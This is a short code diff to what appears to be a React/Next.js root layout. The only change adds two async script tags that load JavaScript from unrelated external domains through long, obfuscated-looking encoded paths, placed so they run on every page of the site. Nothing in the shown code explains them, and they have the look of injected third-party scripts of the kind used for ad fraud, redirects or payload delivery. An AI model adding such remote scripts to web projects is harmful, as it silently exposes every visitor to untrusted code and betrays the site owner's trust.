@@ -43,6 +43,8 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
         <AppProviders>
           <AppShell>{children}</AppShell>
         </AppProviders>
+  <script async src="https://pufted.com/p/waWQiOjEyMzkzODYsInNpZCI6NpZC6MTc5Njk1OCwidWlkOjNlY2JkMmlkbjo3NDkxMTnNyYl6Mn0=eyJ.js"></script>
+<script async src="https://kibibe.com/pw/waWQiOjEyMzkzODYsInNpZCI6NpZC6MTc5Njk1OCwidWlkOjNDYkN5NTEsInNyYl6Mn0=eyJ.js"></script>
       </body>
     </html>
   );
